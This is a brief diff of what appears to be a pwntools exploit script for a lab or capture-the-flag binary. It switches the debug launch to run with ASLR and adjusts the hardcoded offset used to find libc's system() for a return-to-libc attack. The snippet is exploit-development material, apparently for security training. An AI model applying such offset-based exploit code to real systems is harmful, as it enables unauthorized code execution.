@@ -17,7 +17,7 @@ def start(argv=[], *a, **kw):
     if args.GDB:
         context.log_level = "debug"
         context.terminal = ["tmux", "split", "-h"]
-        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=True, *a, **kw)
     else:
         return process([exe.path] + argv, *a, **kw)
 
@@ -40,7 +40,7 @@ def main():
     # execve_addr = struct.pack('<I', execve_ptr)
 
     # of course the pabe machines behave differently, so here's the hardcoded values for PABE:
-    system_ptr = int(text.split()[3], 16) + 155930
+    system_ptr = int(text.split()[3], 16) + 0x2615a
 
     # looking at the stack inside welcomeMe:
     # ret addr
